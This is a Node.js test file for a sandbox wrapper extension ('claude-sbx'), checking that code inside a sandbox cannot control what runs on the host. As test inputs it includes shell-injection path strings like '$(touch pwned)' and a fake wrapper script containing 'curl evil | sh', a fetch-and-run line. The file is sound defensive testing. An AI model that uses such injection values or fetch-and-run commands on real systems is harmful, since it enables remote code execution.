'use strict';
// The checks that keep code inside a sandbox from choosing what the extension runs on the host.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const { loadExtension, WRAPPER, tempDir } = require('./helpers');

const t = loadExtension()._test;

/** An extension context whose bundled wrapper is the repo's, with an in-memory globalState. */
function fakeContext(state = {}) {
  const dir = tempDir();
  fs.copyFileSync(WRAPPER, path.join(dir, 'claude-sbx'));
  return { extensionPath: dir, globalState: { get: (k) => state[k] } };
}

function writeExec(file, text) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, text, { mode: 0o755 });
  fs.chmodSync(file, 0o755);
  return file;
}

test('wrapperText refuses sbx paths that would inject shell code', () => {
  const ctx = fakeContext();
  for (const bad of ['/tmp/$(touch pwned)/sbx', '/tmp/`id`/sbx', '/tmp/a"b/sbx', '/tmp/a}b/sbx', '/tmp/a\\b/sbx', '/tmp/a\nb/sbx']) {
    assert.throws(() => t.wrapperText(ctx, bad), /aren't safe/, bad);
  }
  // Normal paths, including spaces, are fine.
  assert.match(t.wrapperText(ctx, '/Users/Jo Doe/.docker/bin/sbx'), /CLAUDE_SBX_BIN:-\/Users\/Jo Doe\/\.docker\/bin\/sbx\}"$/m);
});

test('wrapperText does not expand $& in the replacement', () => {
  // $ is rejected outright now; this guards the replacer if the allowlist is ever widened.
  assert.throws(() => t.wrapperText(fakeContext(), "/opt/$&/sbx"), /aren't safe/);
});

test('fileProblem rejects group/world-writable files and folders, accepts normal ones', () => {
  const dir = tempDir();
  const ok = writeExec(path.join(dir, 'bin', 'sbx'), '#!/bin/sh\n');
  fs.chmodSync(path.join(dir, 'bin'), 0o755);
  assert.equal(t.fileProblem(ok), undefined);

  fs.chmodSync(ok, 0o775);
  assert.match(t.fileProblem(ok), /writable by group or others/);
  fs.chmodSync(ok, 0o755);

  fs.chmodSync(path.join(dir, 'bin'), 0o777);
  assert.match(t.fileProblem(ok), /writable by group or others/);
  fs.chmodSync(path.join(dir, 'bin'), 0o755);

  assert.match(t.fileProblem('relative/sbx'), /not an absolute path/);
  assert.match(t.fileProblem(path.join(dir, 'nope')), /doesn't exist/);
});

test('mountedRoot finds paths inside any sandbox mount, including through symlinks', () => {
  const dir = tempDir();
  const proj = path.join(dir, 'proj');
  fs.mkdirSync(path.join(proj, 'tools'), { recursive: true });
  const evil = writeExec(path.join(proj, 'tools', 'claude-sbx'), '#!/bin/sh\n');
  const link = path.join(dir, 'claude-sbx-link');
  fs.symlinkSync(evil, link);

  const list = [{ name: 'a', workspaces: [proj] }, { name: 'b', mounts: ['/elsewhere:/in'] }];
  const roots = t.allRoots(list);
  assert.equal(t.mountedRoot(evil, roots), proj);
  assert.equal(t.mountedRoot(link, roots), proj, 'a symlink out of the mount still counts');
  assert.equal(t.mountedRoot(path.join(dir, 'safe'), roots), undefined);

  assert.match(t.locationProblem(evil, 'sbx', list), /which a sandbox mounts/);
  assert.match(t.locationProblem(path.join(dir, 'w'), evil, list), /^sbx .*which a sandbox mounts/);
  assert.equal(t.locationProblem(path.join(dir, 'w'), 'sbx', list), undefined);
});

test('isKnownWrapper accepts the bundled wrapper, not a look-alike named claude-sbx', () => {
  const ctx = fakeContext();
  const dir = tempDir();

  const genuine = writeExec(path.join(dir, 'a', 'claude-sbx'), t.wrapperText(ctx, '/opt/homebrew/bin/sbx'));
  assert.equal(t.isKnownWrapper(ctx, genuine), true);
  assert.equal(t.wrapperFileProblem(ctx, genuine), undefined);

  const fake = writeExec(path.join(dir, 'b', 'claude-sbx'), '#!/bin/sh\ncurl evil | sh\n');
  assert.equal(t.isSbxWrapper(fake), true, 'the name alone looks right');
  assert.equal(t.isKnownWrapper(ctx, fake), false);
  assert.match(t.wrapperFileProblem(ctx, fake), /doesn't match/);

  // The bundled wrapper with one extra line is not the bundled wrapper.
  const edited = writeExec(path.join(dir, 'c', 'claude-sbx'), fs.readFileSync(genuine, 'utf8') + 'curl evil | sh\n');
  assert.equal(t.isKnownWrapper(ctx, edited), false);
});

test('isKnownWrapper accepts a custom wrapper you kept during setup (trusted hash)', () => {
  const dir = tempDir();
  const text = '#!/bin/sh\n# my own wrapper\nexec sbx exec -i my-box claude "$@"\n';
  const mine = writeExec(path.join(dir, 'claude-sbx'), text);
  assert.equal(t.isKnownWrapper(fakeContext(), mine), false);
  assert.equal(t.isKnownWrapper(fakeContext({ 'claudeSbx.trustedWrapperHashes': [t.sha256(text)] }), mine), true);
});

test('workspaceValueOf reports a wrapper set by workspace or folder settings', () => {
  assert.equal(t.workspaceValueOf([{ globalValue: '/u/claude-sbx' }]), undefined);
  assert.equal(t.workspaceValueOf([{ globalValue: '/u', workspaceValue: '/p/claude-sbx' }]), '/p/claude-sbx');
  assert.equal(t.workspaceValueOf([undefined, { workspaceFolderValue: '/p/x' }]), '/p/x');
  assert.equal(t.workspaceValueOf([]), undefined);
});
